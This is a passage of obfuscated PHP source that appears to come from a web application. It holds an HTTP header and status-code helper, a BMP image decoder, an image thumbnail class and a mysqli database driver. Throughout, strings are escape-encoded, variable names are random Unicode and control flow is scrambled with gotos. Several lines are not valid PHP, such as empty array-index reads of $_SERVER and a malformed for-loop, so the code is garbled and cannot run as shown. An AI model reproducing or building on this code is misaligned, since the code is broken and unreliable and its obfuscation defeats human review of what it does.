"\111\x66\x2d\125\156\x6d\x6f\x64\151\x66\x69\145\x64\x2d\123\x69\156\143\145" => "\110\124\124\x50\137\x49\106\137\x55\116\x4d\x4f\104\111\106\x49\105\104\137\x53\x49\x4e\x43\x45", "\x52\x61\x6e\147\x65" => "\x48\124\124\120\x5f\x52\101\x4e\107\x45", "\124\x69\155\145\157\x75\164" => "\110\x54\x54\x50\x5f\x54\111\115\x45\x4f\x55\x54", "\x49\x66" => "\110\x54\124\120\137\111\x46", "\114\x6f\143\x6b\55\x54\x6f\x6b\x65\156" => "\110\124\x54\x50\x5f\114\x4f\103\113\x5f\x54\117\x4b\105\116", "\117\166\x65\162\167\x72\x69\x74\145" => "\110\124\124\120\x5f\117\x56\105\122\x57\x52\x49\x54\105", "\x44\145\x73\x74\x69\x6e\x61\x74\151\x6f\x6e" => "\x48\x54\x54\120\137\x44\105\123\124\111\x4e\101\x54\x49\x4f\x4e", "\x52\145\x71\x75\145\x73\164\55\x49\x64" => "\122\x45\x51\x55\x45\123\124\x5f\x49\104", "\x52\x65\x71\165\x65\x73\164\x2d\102\x6f\x64\x79\x2d\x46\151\x6c\145" => "\x52\105\121\x55\x45\x53\x54\137\x42\x4f\x44\x59\x5f\x46\x49\114\105", "\122\x65\144\x69\x72\x65\143\x74\55\x53\x74\141\164\165\x73" => "\x52\x45\x44\111\122\105\103\124\137\x53\124\101\124\x55\123"); public static function init() { static $BՄʂ֡ = false; if ($BՄʂ֡) { return; } foreach ($_SERVER as $b => $DҸ) { $b = strtoupper($b); if (!array_key_exists($b, $_SERVER)) { continue; } $_SERVER[$b] = $DҸ; } foreach (self::$_headers as $b => $Fȫ) { if (!array_key_exists($b, $_SERVER)) { continue; } $_SERVER[$b] = $_SERVER[$Fȫ]; $_SERVER[strtoupper($b)] = $_SERVER[$Fȫ]; } } public static function get($F뢯) { self::init(); return $_SERVER[$F뢯] ? $_SERVER[$F뢯] : $_SERVER[$_SERVER[][1845] . strtoupper($F뢯)]; } public static function method() { return strtoupper(self::get($_SERVER[][154])); } public static function length() { $bގ =& $_SERVER[]; $eӽས = self::get($bގ[1846]); if (!$eӽས) { $eӽས = self::get($bގ[1162]); } return $eӽས; } public static function range() { $Bþ =& $_SERVER[]; $B = self::get($Bþ[198]); if (!$B) { return !1; } if (!preg_match($Bþ[1847], $B, $c٦)) { return !1; } if ($c٦[1] === $Bþ[33] && $c٦[2] === $Bþ[33]) { return !1; } return array($c٦[1] !== $Bþ[33] ? $c٦[1] : null, $c٦[2] !== $Bþ[33] ? $c٦[2] : null); } public static $statusCode = array("\x31\x30\60" => "\x43\x6f\x6e\164\x69\156\x75\145", "\x31\x30\x31" => "\x53\x77\x69\164\x63\150\151\x6e\147\40\120\x72\x6f\x74\157\143\x6f\154", "\x31\60\x32" => "\120\x72\157\143\x65\x73\163\151\156\147", "\x31\x30\63" => "\105\141\162\x6c\171\40\x48\x69\x6e\164\x73", "\62\x30\x30" => "\117\x4b", "\x32\x30\61" => "\103\x72\145\x61\x74\145\x64", "\x32\60\x32" => "\101\x63\x63\145\x70\x74\145\x64", "\62\60\63" => "\116\x6f\156\x2d\x41\x75\x74\150\157\x72\151\164\x61\164\151\x76\145\40\111\x6e\146\x6f\162\155\141\x74\151\x6f\x6e", "\62\60\x34" => "\x4e\157\40\x43\x6f\156\x74\x65\x6e\164", "\x32\x30\65" => "\122\x65\163\x65\164\x20\103\x6f\156\164\145\x6e\x74", "\62\60\x36" => "\x50\141\162\x74\x69\x61\x6c\40\103\x6f\156\x74\145\156\x74", "\x32\x30\67" => "\x4d\165\154\164\151\x2d\123\164\x61\164\x75\x73", "\x33\60\60" => "\115\x75\154\x74\x69\x70\154\145\x20\103\150\157\151\143\145\x73", "\x33\60\x31" => "\x4d\157\x76\x65\x64\x20\120\145\162\155\141\x6e\145\156\x74\154\x79", "\x33\x30\62" => "\106\x6f\x75\156\144", "\x33\60\x33" => "\123\145\145\x20\x4f\x74\150\145\162", "\x33\x30\x34" => "\x4e\x6f\164\40\115\x6f\x64\151\x66\x69\x65\x64", "\63\x30\65" => "\125\x73\x65\x20\120\162\157\170\171", "\x33\x30\x37" => "\x54\x65\x6d\x70\x6f\x72\x61\162\171\40\x52\x65\x64\151\162\145\x63\x74", "\x33\60\x38" => "\x50\x65\162\x6d\x61\x6e\145\x6e\x74\40\122\145\144\151\162\x65\143\x74", "\x34\60\60" => "\x42\x61\144\40\x52\x65\x71\x75\x65\163\164", "\x34\60\x31" => "\x55\156\141\x75\164\150\x6f\x72\151\172\x65\144", "\64\x30\x32" => "\x50\141\171\155\x65\x6e\164\x20\x52\145\161\165\151\162\x65\x64", "\x34\60\63" => "\x46\x6f\162\142\151\x64\144\x65\156", "\64\60\64" => "\x4e\x6f\164\x20\106\x6f\x75\x6e\144", "\64\60\x35" => "\115\x65\x74\150\157\144\x20\116\x6f\164\x20\x41\x6c\154\157\x77\x65\144", "\x34\x30\x36" => "\x4e\x6f\164\40\x41\143\x63\145\x70\164\141\142\154\x65", "\x34\x30\67" => "\x50\162\x6f\170\171\x20\101\165\x74\150\145\x6e\x74\x69\143\141\164\151\x6f\156\40\122\145\x71\165\x69\162\145\x64", "\x34\x30\70" => "\x52\x65\x71\165\145\163\x74\40\124\x69\x6d\x65\157\x75\164", "\64\x30\x39" => "\103\157\156\x66\x6c\151\143\164", "\x34\x31\x30" => "\107\157\156\x65", "\64\61\x31" => "\x4c\x65\x6e\147\x74\x68\40\x52\145\161\165\151\x72\145\144", "\x34\61\x32" => "\x50\x72\145\x63\157\156\144\151\x74\x69\157\x6e\x20\106\x61\151\154\x65\x64", "\64\61\63" => "\122\145\161\x75\x65\x73\x74\x20\105\156\164\x69\x74\x79\x20\124\157\157\40\114\141\x72\x67\145", "\x34\61\x34" => "\x52\145\161\165\145\163\x74\x20\x55\x52\x49\x20\x54\157\x6f\40\x4c\x61\x72\147\x65", "\x34\x31\x35" => "\125\x6e\x73\165\x70\x70\x6f\x72\x74\x65\144\40\115\x65\x64\x69\x61\40\x54\x79\x70\x65", "\64\x31\66" => "\122\145\x71\x75\145\x73\x74\x65\144\x20\122\141\156\147\145\x20\x4e\x6f\x74\40\x53\x61\x74\151\x73\x66\x69\x61\142\x6c\145", "\64\x31\x37" => "\x45\x78\160\145\x63\x74\x61\x74\151\x6f\156\40\x46\x61\151\x6c\x65\144", "\64\62\x32" => "\x55\x6e\x70\162\157\x63\145\x73\x73\x61\142\154\x65\40\105\156\164\151\x74\171", "\x34\x32\x33" => "\114\157\143\x6b\145\144", "\x34\62\x34" => "\106\141\x69\x6c\x65\144\40\104\x65\160\x65\156\144\145\156\143\171", "\64\x32\x35" => "\125\156\157\162\x64\145\162\x65\144\40\103\157\154\154\x65\143\164\x69\157\x6e", "\64\62\x36" => "\125\x70\147\x72\x61\x64\x65\40\122\x65\161\165\151\162\145\x64", "\x34\x32\70" => "\120\162\145\x63\157\156\x64\151\164\151\157\x6e\40\x52\x65\x71\165\x69\162\145\144", "\x34\62\71" => "\124\157\157\x20\x4d\141\x6e\171\40\122\145\161\165\145\163\x74\x73", "\x34\63\x31" => "\122\x65\x71\x75\145\x73\164\x20\x48\x65\x61\144\x65\x72\x20\106\x69\x65\154\144\163\x20\124\x6f\x6f\40\x4c\x61\162\x67\145", "\64\64\x34" => "\x4e\157\40\122\145\163\160\x6f\156\163\x65", "\x34\65\x30" => "\102\154\x6f\143\x6b\x65\144\x20\x62\171\x20\127\x69\156\x64\x6f\167\x73\40\120\x61\x72\x65\x6e\164\x61\154\40\103\x6f\156\164\x72\157\154\x73", "\x34\x35\x31" => "\125\x6e\141\x76\x61\x69\x6c\141\142\154\145\x20\106\x6f\x72\40\x4c\145\x67\141\x6c\x20\122\x65\141\x73\157\156\163", "\64\71\x34" => "\122\x65\161\165\145\163\164\40\x48\145\141\144\x65\162\40\124\157\157\40\x4c\141\x72\147\x65", "\65\x30\60" => "\x49\156\164\145\162\x6e\x61\154\x20\x53\x65\x72\166\x65\x72\x20\x45\x72\162\157\x72", "\x35\60\x31" => "\x4e\x6f\x74\x20\111\x6d\160\154\x65\x6d\x65\156\164\x65\x64", "\x35\60\x32" => "\102\x61\144\40\x47\x61\164\x65\x77\x61\x79", "\65\x30\x33" => "\123\x65\x72\x76\x69\x63\145\x20\x55\156\141\166\x61\x69\154\x61\142\154\145", "\65\60\64" => "\107\x61\x74\145\167\x61\x79\40\x54\x69\155\145\157\x75\164", "\65\x30\65" => "\110\124\124\x50\x20\x56\x65\162\x73\x69\157\x6e\x20\156\x6f\164\x20\x73\x75\x70\160\157\x72\164\x65\x64", "\65\x30\67" => "\x49\x6e\163\x75\x66\x66\x69\143\x69\x65\x6e\x74\40\x53\164\x6f\162\x61\147\145"); public static function code($Cĳ) { $A =& $_SERVER[]; $Cĳ = $Cĳ . $A[33]; $A = self::$statusCode[$Cĳ]; $A = $A ? "\x48\124\124\120\x2f\x31\56\61\x20{$Cĳ}\40" . $A : $A[33]; return $A; } } class ImageGdBMP { public static function load($Eԕ) { $F = fopen($Eԕ, $_SERVER[][1537]); if ($F === !1) { return !1; } $E = self::loadFromStream($F); fclose($F); return $E; } public static function loadFromStream($AĨ) { $D苹 =& $_SERVER[]; $aσ = fread($AĨ, 14); if ($aσ === !1) { return !1; } if ($aσ[0] != $D苹[1848] || $aσ[1] != $D苹[1849]) { return !1; } $c˘ = unpack($D苹[1850] . $D苹[1851] . $D苹[1852] . $D苹[1853] . $D苹[1854], $aσ); return self::loadFromStreamAndFileHeader($AĨ, $c˘); } public static function loadFromStreamAndFileHeader($D, array $cڢ) { goto BشԘو; F߉: $D̪ = abs($bƇ); $EӤӋ = $bƇ > 0 ? $D̪ - 1 : 0; $f促 = $bƇ > 0 ? -1 : 1; goto AڏՎ͉; AڏՎ͉: if ($c܄ٚ == 1 || $c܄ٚ == 4 || $c܄ٚ == 8) { goto F; Cϻ: $a = (1 << $c܄ٚ) - 1 << $F; if ($aƑꩻ == 1 || $aƑꩻ == 2) { $aϻ = 0; $Aମ = $c܄ٚ >> 2 & 1; for (;;) { if ($aϻ < -1 || $aϻ > $B || $EӤӋ < -1 || $EӤӋ > $bƇ) { imagedestroy($C҂،); return !1; } $d⠾ = fread($D, 1); if ($d⠾ === !1) { imagedestroy($C҂،); return !1; } switch ($d⠾) { case $c܏[1873]: $d⠾ = fread($D, 1); if ($d⠾ === !1) { imagedestroy($C҂،); return !1; } switch ($d⠾) { case $c܏[1873]: $EӤӋ += $f促; $aϻ = 0; break; case $c܏[1875]: $EӤӋ = 0; $aϻ = 0; break 3; case $c܏[1876]: $d⠾ = fread($D, 2); if ($d⠾ === !1) { imagedestroy($C҂،); return !1; } list(, $A˛, $Aőᐉ) = unpack($c܏[1877], $d⠾); $aϻ += $A˛; $EӤӋ += $Aőᐉ * $f促; break; default: list(, $dʟ) = unpack($c܏[1878], $d⠾); $C = ($dʟ >> $Aମ) + ($dʟ & $Aମ); $d⠾ = fread($D, $C + 1 & ~1); if ($d⠾ === !1) { imagedestroy($C҂،); return !1; } for ($B딃 = 0, $E = 0; $B딃 < $dʟ; ++$B딃, ++$aϻ, $E += $c܄ٚ) { list(, $cö) = unpack($c܏[1878], $d⠾[$E >> 3]); $D = $E & 7; imagesetpixel($C҂،, $aϻ, $EӤӋ, $Cߡ[($cö & $a >> $D) >> $F - $D]); } break; } break; default: $E΄ = fread($D, 1); if ($E΄ === !1) { imagedestroy($C҂،); return !1; } list(, $A, $cö) = unpack($c܏[1877], $d⠾ . $E΄); for ($B딃 = 0, $E = 0; $B딃 < $A; ++$B딃, ++$aϻ, $E += $c܄ٚ) { $D = $E & 7; imagesetpixel($C҂،, $aϻ, $EӤӋ, $Cߡ[($cö & $a >> $D) >> $F - $D]); } break; } } } else { for ($Aۇ = 0; $Aۇ < $D̪; ++$Aۇ, $EӤӋ += $f促) { $d⠾ = fread($D, $Dզ); if ($d⠾ === !1) { imagedestroy($C҂،); return !1; } $E = 0; for ($aϻ = 0; $aϻ < $B; ++$aϻ, $E += $c܄ٚ) { list(, $cö) = unpack($c܏[1878], $d⠾[$E >> 3]); $D = $E & 7; imagesetpixel($C҂،, $aϻ, $EӤӋ, $Cߡ[($cö & $a >> $D) >> $F - $D]); } } } goto Dש; F: $C҂، = imagecreate($B, $D̪); $Eґ = $E䷓͗ == 12 ? 3 : 4; $c = $fԳ ? $fԳ : pow(2, $c܄ٚ); goto bӦ񞡍; bӦ񞡍: $Cߡ = array(); for ($B딃 = 0; $B딃 < $c; ++$B딃) { $d⠾ = fread($D, $Eґ); if ($d⠾ === !1) { imagedestroy($C҂،); return !1; } extract(unpack($c܏[1874], $d⠾ . $c܏[1873])); $Cߡ[] = imagecolorallocate($C҂،, $DŬՏ, $Aů, $D); } $F = 8 - $c܄ٚ; goto Cϻ; Dש: } else { goto Dͣׄ; aд: for ($Aۇ = 0; $Aۇ < $D̪; ++$Aۇ, $EӤӋ += $f促) { $d⠾ = fread($D, $Dզ); if ($d⠾ === !1) { imagedestroy($C҂،); return !1; } $E = 0; for ($aϻ = 0; $aϻ < $B; ++$aϻ, $E += $a²) { list(, $cö) = unpack($c܏[1855], substr($d⠾, $E, $a²) . $c܏[1879]); $e = $cö & $cڵ; $b듛 = $cö & $F٨; $F׬ = $cö & $fʍ蝦ވ; $D = $cö & $Dߧ; $Fٴ = $BƳ - (($e << 7) - $e) * $Aۇ; $DŬՏ = (($b듛 << 8) - $b듛) * $A䋊; $Aů = (($F׬ << 8) - $F׬) * $BɎ萡; $D = (($D << 8) - $D) * $dԫ; imagesetpixel($C҂،, $aϻ, $EӤӋ, $Fٴ << 24 | $DŬՏ << 16 | $Aů << 8 | $D); } } imagealphablending($C҂،, !0); goto F; Eºҥ: $A䋊 = $F٨ ? 1 / $F٨ : 1; $BɎ萡 = $fʍ蝦ވ ? 1 / $fʍ蝦ވ : 1; $dԫ = $Dߧ ? 1 / $Dߧ : 1; goto aд; Dͣׄ: $C҂، = imagecreatetruecolor($B, $D̪); imagealphablending($C҂،, !1); if ($cڵ) { imagesavealpha($C҂،, !0); } goto B; B: $a² = $c܄ٚ >> 3; $BƳ = $cڵ ? 127 : 0; $Aۇ = $cڵ ? 1 / $cڵ : 1; goto Eºҥ; F: } return $C҂،; goto B; BشԘو: $c܏ =& $_SERVER[]; if ($cڢ[$c܏[388]] != 19778) { return !1; } $d⠾ = fread($D, 4); goto e; cچ: if ($B == 0 || $bƇ == 0 || $a횖 != 1 || ($cڵ & $F٨) != 0 || ($cڵ & $fʍ蝦ވ) != 0 || ($cڵ & $Dߧ) != 0 || ($F٨ & $fʍ蝦ވ) != 0 || ($F٨ & $Dߧ) != 0 || ($fʍ蝦ވ & $Dߧ) != 0) { return !1; } if ($aƑꩻ == 4 || $aƑꩻ == 5) { $d⠾ = stream_get_contents($D, $bΦ); if ($d⠾ === !1) { return !1; } return imagecreatefromstring($d⠾); } $Dզ = $B * $c܄ٚ + 31 >> 3 & ~3; goto F߉; e: if ($d⠾ === !1) { return !1; } list(, $E䷓͗) = unpack($c܏[1855], $d⠾); if ($E䷓͗ == 12) { goto bԱ; bԱ: $d⠾ = fread($D, $E䷓͗ - 4); if ($d⠾ === !1) { return !1; } extract(unpack($c܏[1856] . $c܏[1857] . $c܏[1858] . $c܏[1859], $d⠾)); goto b; b: $fԳ = $EՄ = $cڵ = $aƑꩻ = 0; $F٨ = 16711680; $fʍ蝦ވ = 65280; goto Eˋ; Eˋ: $Dߧ = 255; goto eܥĖ; eܥĖ: } else { if (124 < $E䷓͗ || $E䷓͗ < 40) { return !1; } else { goto dܰ; Cʒ: if (($c܄ٚ == 16 || $c܄ٚ == 24 || $c܄ٚ == 32) && $aƑꩻ == 0 && $F٨ == 0 && $fʍ蝦ވ == 0 && $Dߧ == 0) { switch ($c܄ٚ) { case 16: $F٨ = 31744; $fʍ蝦ވ = 992; $Dߧ = 31; break; case 24: case 32: $F٨ = 16711680; $fʍ蝦ވ = 65280; $Dߧ = 255; break; } } goto C⪮; dܰ: $d⠾ = fread($D, 36); if ($d⠾ === !1) { return !1; } extract(unpack($c܏[1860] . $c܏[1861] . $c܏[1858] . $c܏[1862] . $c܏[1863] . $c܏[1864] . $c܏[1865] . $c܏[1866] . $c܏[1867] . $c܏[1868], $d⠾)); goto e; e: if ($B & 2147483648) { $B = -(~$B & 4294967295) - 1; } if ($bƇ & 2147483648) { $bƇ = -(~$bƇ & 4294967295) - 1; } if ($Fƿꌿ & 2147483648) { $Fƿꌿ = -(~$Fƿꌿ & 4294967295) - 1; } goto b򲆟; b򲆟: if ($Dޑޅ & 2147483648) { $Dޑޅ = -(~$Dޑޅ & 4294967295) - 1; } if ($cڢ[$c܏[520]] != 0) { $D = $c܄ٚ == 1 || $c܄ٚ == 4 || $c܄ٚ == 8 ? ($fԳ ? $fԳ : pow(2, $c܄ٚ)) << 2 : 0; $c = $bΦ ? $bΦ : ($B * $c܄ٚ + 31 >> 3 & ~3) * abs($bƇ); $aޭ = $cڢ[$c܏[520]] - $c - $D - 14; if ($E䷓͗ < $aޭ && 40 <= $E䷓͗ && $E䷓͗ <= 124) { $E䷓͗ = $aޭ; } } if ($E䷓͗ - 40 > 0) { $d⠾ = fread($D, $E䷓͗ - 40); if ($d⠾ === !1) { return !1; } extract(unpack($c܏[1869] . $c܏[1870] . $c܏[1871] . $c܏[1872], $d⠾ . str_repeat($c܏[1873], 120))); } else { $cڵ = $F٨ = $fʍ蝦ވ = $Dߧ = 0; } goto Cʒ; C⪮: } } goto cچ; B: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($b, $D̊) { goto a; c㩠: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto Fܒ; fЉ: if (!$this->im) { return !1; } $Aޤ = $_SERVER[][33]; $this->imgData = GetImageSize($b, $Aޤ); goto c㩠; a: $this->srcFile = $b; $this->echoType = $D̊; $this->im = self::image($b); goto fЉ; Fܒ: } public static function image($fʷ) { $Bٓ =& $_SERVER[]; $fĂ = $Bٓ[33]; $cފˤ = GetImageSize($fʷ, $fĂ); $CɊ = !1; switch ($cފˤ[2]) { case IMAGETYPE_GIF: if (!function_exists($Bٓ[1880])) { break; } $CɊ = imagecreatefromgif($fʷ); break; case IMAGETYPE_JPEG: if (!function_exists($Bٓ[1881])) { break; } $CɊ = imagecreatefromjpeg($fʷ); break; case IMAGETYPE_PNG: if (!function_exists($Bٓ[1882])) { break; } $CɊ = @imagecreatefrompng($fʷ); imagesavealpha($CɊ, !0); break; case IMAGETYPE_XBM: $CɊ = imagecreatefromxbm($fʷ); break; case IMAGETYPE_WBMP: $CɊ = imagecreatefromwbmp($fʷ); break; case IMAGETYPE_BMP: $CɊ = imagecreatefrombmp($fʷ); break; default: break; } return $CɊ; } public static function imageSize($d) { $e =& $_SERVER[]; $a͝ = GetImageSize($d); if (!$a͝) { return !1; } return array($e[1883] => $a͝[0], $e[1884] => $a͝[1]); } function distortion($cى, $d, $aҶ) { $c = $this->creatImage($this->im, $d, $aҶ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($c, $cى); } function prorate($EŞ, $D, $E) { $c = $D / $E; $Fސ = $this->srcW / $this->srcH; if ($c <= $Fސ) { $b쪑ͅ = $D; $BÔ = $b쪑ͅ * ($this->srcH / $this->srcW); } else { $BÔ = $E; $b쪑ͅ = $BÔ * ($this->srcW / $this->srcH); } if ($this->srcW > $D || $this->srcH > $E) { $F = $this->creatImage($this->im, $b쪑ͅ, $BÔ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($F, $EŞ); } else { $F = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($F, $EŞ); } } function cut($B, $A, $eƍɮ) { goto Cڿ; bυ: return $this->echoImage($Eɝ޼, $B); goto d; A: $c­͕ = $this->creatImage($this->im, $D, $b, 0, 0, 0, 0, $this->srcW, $this->srcH); $Eɝ޼ = $this->creatImage($c­͕, $A, $eƍɮ, 0, 0, ($D - $A) / 2, ($b - $eƍɮ) / 2, $A, $eƍɮ); imageDestroy($c­͕); goto bυ; Cڿ: $Eڵ = $A / $eƍɮ; $Bݣ = $this->srcW / $this->srcH; if ($Eڵ <= $Bݣ) { $b = $eƍɮ; $D = $b * ($this->srcW / $this->srcH); } else { $D = $A; $b = $D * ($this->srcH / $this->srcW); } goto A; d: } function backFill($C߻е, $fΐۄ, $C, $dú = false, $DǙ᫬ = 255, $CͲ = 255, $c՛ = 255) { goto bޑ; bޑ: $D¥ = $fΐۄ / $C; $Bˍ = $this->srcW / $this->srcH; if ($D¥ <= $Bˍ) { $dʐ = $fΐۄ; $d㔩 = $dʐ * ($this->srcH / $this->srcW); } else { $d㔩 = $C; $dʐ = $d㔩 * ($this->srcW / $this->srcH); } goto Fɜʉ; Fɜʉ: if (function_exists($_SERVER[][1885])) { @($e䝋 = imageCreateTrueColor($fΐۄ, $C)); if (!$e䝋) { $e䝋 = imageCreate($fΐۄ, $C); } } else { $e䝋 = imageCreate($fΐۄ, $C); } $DǦ = ($C - $d㔩) / 2; $B = imagecolorallocate($e䝋, $DǙ᫬, $CͲ, $c՛); goto f磓; eܡ: return $this->echoImage($e䝋, $C߻е); goto E؅; f磓: if ($dú) { $B = imageColorTransparent($e䝋, $B); $DǦ = $C - $d㔩; } imageFilledRectangle($e䝋, 0, 0, $fΐۄ, $C, $B); if ($this->srcW > $fΐۄ || $this->srcH > $C) { $C = $this->creatImage($this->im, $dʐ, $d㔩, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($dʐ < $fΐۄ) { imageCopy($e䝋, $C, ($fΐۄ - $dʐ) / 2, 0, 0, 0, $dʐ, $d㔩); } else { if ($d㔩 < $C) { imageCopy($e䝋, $C, 0, $DǦ, 0, 0, $dʐ, $d㔩); } else { imageCopy($e䝋, $C, 0, 0, 0, 0, $dʐ, $d㔩); } } } else { imageCopyMerge($e䝋, $this->im, ($fΐۄ - $dʐ) / 2, $DǦ, 0, 0, $dʐ, $d㔩, 100); } goto eܡ; E؅: } function creatImage($cа, $c, $Cߺ, $cȂ, $Aǹ, $a×, $b, $Aܰ, $bȘ) { if (function_exists($_SERVER[][1885])) { @($eѴ = ImageCreateTrueColor($c, $Cߺ)); @imagealphablending($eѴ, !1); @imagesavealpha($eѴ, !0); if ($eѴ) { imageCopyResampled($eѴ, $cа, $cȂ, $Aǹ, $a×, $b, $c, $Cߺ, $Aܰ, $bȘ); } else { $eѴ = ImageCreate($c, $Cߺ); imageCopyResized($eѴ, $cа, $cȂ, $Aǹ, $a×, $b, $c, $Cߺ, $Aܰ, $bȘ); } } else { $eѴ = ImageCreate($c, $Cߺ); imageCopyResized($eѴ, $cа, $cȂ, $Aǹ, $a×, $b, $c, $Cߺ, $Aܰ, $bȘ); } return $eѴ; } public function imgRotate($cᜭ, $dڰ) { goto c; cۏ: return $b; goto cϵ; c: if (!$this->im || $dڰ % 360 === 0 || !function_exists($_SERVER[][1886])) { return !1; } $D = imageRotate($this->im, 360 - $dڰ, 0); $b = !1; goto D; D: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $b = imagegif($D, $cᜭ); break; case IMAGETYPE_JPEG: $b = imagejpeg($D, $cᜭ, 100); break; case IMAGETYPE_PNG: $b = imagePNG($D, $cᜭ); break; default: break; } imageDestroy($D); imageDestroy($this->im); goto cۏ; cϵ: } function echoImage($Fɾ, $aݥ) { goto A; A: $Aޗ =& $_SERVER[]; if (!$Fɾ) { return !1; } ob_get_clean(); goto DՋ; DՋ: $F͝ = !1; switch ($this->echoType) { case $Aޗ[1887]: $F͝ = imagePNG($Fɾ); break; case $Aޗ[167]: $F͝ = imagePNG($Fɾ, $aݥ); break; } imageDestroy($Fɾ); goto cڂ; cڂ: imageDestroy($this->im); return $F͝; goto B폢; B폢: } } goto f͜; bﻍ: class DbMysqli extends Db { public function __construct($E = '') { $eįԠ =& $_SERVER[]; if (!extension_loaded($eįԠ[746])) { think_exception(think_lang($eįԠ[10]) . $eįԠ[840]); } if (!empty($E)) { $this->config = $E; if (empty($this->config[$eįԠ[13]])) { $this->config[$eįԠ[13]] = $eįԠ[33]; } } } public function connect($C = '', $f = 0) { $Eר놠 =& $_SERVER[]; if (!isset($this->linkID[$f])) { goto C߳; C߳: if (empty($C)) { $C = $this->config; } $this->linkID[$f] = new mysqli($C[$Eר놠[814]], $C[$Eר놠[816]], $C[$Eר놠[817]], $C[$Eר놠[17]], $C[$Eר놠[815]] ? intval($C[$Eר놠[815]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto eۅ; eۅ: $Dݸӧ = $this->linkID[$f]->server_version; $this->linkID[$f]->query($Eר놠[818] . think_config($Eר놠[819]) . $Eר놠[55]); if ($Dݸӧ > $Eר놠[820]) { $this->linkID[$f]->query($Eר놠[821]); } goto f䵠; f䵠: $this->connected = !0; if (1 != think_config($Eר놠[18])) { unset($this->config); } goto dۚ; dۚ: } return $this->linkID[$f]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($A쟝ې) { goto Cõ; c맭: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto Fَ; bÝ: $this->queryStr = $A쟝ې; if ($this->queryID) { $this->free(); } think_action_status($A펔޸[19], 1); goto Dا; Dا: think_status($A펔޸[20]); $this->queryID = $this->_linkID->query($A쟝ې); if ($this->_linkID->more_results()) { while (($F = $this->_linkID->next_result()) != NULL) { $F->free_result(); } } goto c맭; Cõ: $A펔޸ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto bÝ; Fَ: } public function execute($bʬ) { goto fߦ; e: $this->queryStr = $bʬ; if ($this->queryID) { $this->free(); } think_action_status($Bޫ[21], 1); goto d; fߦ: $Bޫ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e; Fђ: if (!1 === $D쇴) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto DׅѢ; d: think_status($Bޫ[20]); $D쇴 = $this->_linkID->query($bʬ); $this->debug(); goto Fђ; DׅѢ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aӞ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$aӞ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $eĮ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$eĮ) { $this->error(); return !1; } } return !0; } private function getAll() { $Dƾ = array(); if ($this->numRows > 0) { for ($B; = 0; $B; < $this->numRows; $B;++) { $Dƾ[$B;] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Dƾ; } public function getFields($Fʛ) { $fƻ =& $_SERVER[]; $Dʌ = $this->query($fƻ[825] . $this->parseKey($Fʛ)); $aؓв = array(); if ($Dʌ) { foreach ($Dʌ as $e® => $dİݻ) { $aؓв[$dİݻ[$fƻ[27]]] = array($fƻ[28] => $dİݻ[$fƻ[27]], $fƻ[29] => $dİݻ[$fƻ[30]], $fƻ[31] => (bool) ($dİݻ[$fƻ[32]] === $fƻ[33]), $fƻ[34] => $dİݻ[$fƻ[35]], $fƻ[36] => strtolower($dİݻ[$fƻ[37]]) == $fƻ[38], $fƻ[39] => strtolower($dİݻ[$fƻ[40]]) == $fƻ[41]); } } return $aؓв; } public function getTables($D = '') { $A܂ =& $_SERVER[]; $a = !empty($D) ? $A܂[827] . $D : $A܂[828]; $bƪ = $this->query($a); $D̅ = array(); if ($bƪ) { foreach ($bƪ as $F => $bԎ) { $D̅[$F] = current($bԎ); } } return $D̅; } public function replace($F, $b = array()) { $B =& $_SERVER[]; foreach ($F as $A => $e) { $B̏ = $this->parseValue($e); if (is_scalar($B̏)) { $e[] = $B̏; $BȠ[] = $this->parseKey($A); } } $AȻݰ = $B[829] . $this->parseTable($b[$B[267]]) . $B[830] . implode($B[47], $BȠ) . $B[831] . implode($B[47], $e) . $B[832]; return $this->execute($AȻݰ); } public function insertAll($Eϧ̭, $aČ = array(), $b׻ = false) { goto D; Cč: $b = array(); foreach ($Eϧ̭ as $C) { $D = array(); foreach ($C as $dΏ => $f) { $f = $this->parseValue($f); if (is_scalar($f)) { $D[] = $f; } } $b[] = $C[248] . implode($C[47], $D) . $C[832]; } array_walk($A癔, array($this, $C[833])); goto C槠; D: $C =& $_SERVER[]; if (!is_array($Eϧ̭[0])) { return !1; } $A癔 = array_keys($Eϧ̭[0]); goto Cč; C槠: $c٥ = ($b׻ ? $C[834] : $C[835]) . $C[836] . $this->parseTable($aČ[$C[267]]) . $C[830] . implode($C[47], $A癔) . $C[837] . implode($C[47], $b); return $this->execute($c٥); goto bۄ؅; bۄ؅: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $B =& $_SERVER[]; $this->error = $this->_linkID->errno . $B[4] . $this->_linkID->error; if ($B[33] != $this->queryStr) { $this->error .= LNG($B[45]) . $this->queryStr; } think_trace($this->error, $B[33], $B[46]); return $this->error; } public function escapeString($e䶬ݰ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($e䶬ݰ); } else { return addslashes($e䶬ݰ); } } public function parseKey(&$Dٓ, $FҤ = true) { $D =& $_SERVER[]; if ($FҤ) { $Dٓ = $this->parseKeyCheck($Dٓ); } if ($Dٓ != $D[176] && !preg_match($D[838], $Dٓ)) { $Dٓ = $D[839] . 